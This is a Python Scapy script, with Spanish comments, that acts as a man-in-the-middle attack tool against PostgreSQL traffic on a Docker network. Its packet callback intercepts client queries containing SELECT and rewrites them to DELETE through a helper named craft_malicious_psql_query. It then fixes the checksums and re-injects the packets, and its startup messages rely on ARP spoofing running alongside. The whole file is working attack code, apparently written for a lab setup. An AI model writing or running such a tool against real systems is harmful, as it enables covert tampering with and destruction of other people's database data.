from scapy.all import *
import sys
from psql_utils import craft_malicious_psql_query # Importamos la función de nuestro archivo de utilidades

CLIENT_IP = "172.17.0.3" 
SERVER_IP = "172.17.0.2" 
INTERFACE = "docker0" 
def packet_callback(packet: Packet):
    if IP in packet and TCP in packet:
        if packet[TCP].dport == 5432 or packet[TCP].sport == 5432:
            if packet[IP].src == CLIENT_IP and packet[IP].dst == SERVER_IP and Raw in packet:
                original_psql_payload = packet[Raw].load
                if original_psql_payload.startswith(b'Q'):
                    try:
                        message_length = int.from_bytes(original_psql_payload[1:5], 'big')
                        sql_string_bytes = original_psql_payload[5:message_length] 
                        original_sql = sql_string_bytes.decode('utf-8', errors='ignore').strip('\x00') # Eliminar el terminador nulo
                        if "SELECT" in original_sql.upper(): 
                            print(f"\n[+] INTERCEPTADO: Consulta PSQL de {CLIENT_IP} a {SERVER_IP}")
                            print(f"    Original SQL: {original_sql}")
                            modified_psql_payload = craft_malicious_psql_query(
                                original_sql=original_sql,      
                                replacement_text="DELETE",      
                                target_text="SELECT"           
                            )

                           
                            new_pkt = packet.copy()
                            new_pkt[TCP].remove_payload() 
                            new_pkt[TCP].add_payload(Raw(load=modified_psql_payload)) 
                            if IP in new_pkt:
                                del new_pkt[IP].len
                                del new_pkt[IP].chksum
                            if TCP in new_pkt:
                                del new_pkt[TCP].chksum

                            print(f"    MODIFICADO: Enviando consulta modificada a {SERVER_IP}")
                            print(f"    Nueva SQL: {modified_psql_payload[5:].decode('utf-8', errors='ignore').strip('\x00')}") 
                            sendp(new_pkt, iface=INTERFACE, verbose=0)
                            return
                        else:
                           
                            sendp(packet, iface=INTERFACE, verbose=0) 
                            return
                    except Exception as e:
                        print(f"[-] ERROR al procesar mensaje PSQL de {CLIENT_IP}: {e}. Reenviando original.")
                        sendp(packet, iface=INTERFACE, verbose=0) 
                        return
                else:
                    
                    sendp(packet, iface=INTERFACE, verbose=0) 
                    return

            
            elif packet[IP].src == SERVER_IP and packet[IP].dst == CLIENT_IP:
                sendp(packet, iface=INTERFACE, verbose=0) 
                return
    
    sendp(packet, iface=INTERFACE, verbose=0) 


print("[*] Modificador de tráfico PSQL iniciado...")
print(f"[*] Escuchando tráfico entre Cliente ({CLIENT_IP}) y Servidor ({SERVER_IP}) en puerto 5432.")
print("[*] Asegúrate de que el reenvío IP esté habilitado y el ARP Spoofing esté activo en otras terminales.")
print("[*] Presiona Ctrl+C para detener el sniffing.")
try:
    sniff(filter=f"tcp port 5432 and (host {CLIENT_IP} or host {SERVER_IP})", prn=packet_callback, iface=INTERFACE, store=0)
except KeyboardInterrupt:
    print("\n[*] Deteniendo el script de modificación de tráfico.")
except Exception as e:
    print(f"[*] Ocurrió un error inesperado: {e}")
    sys.exit(1)

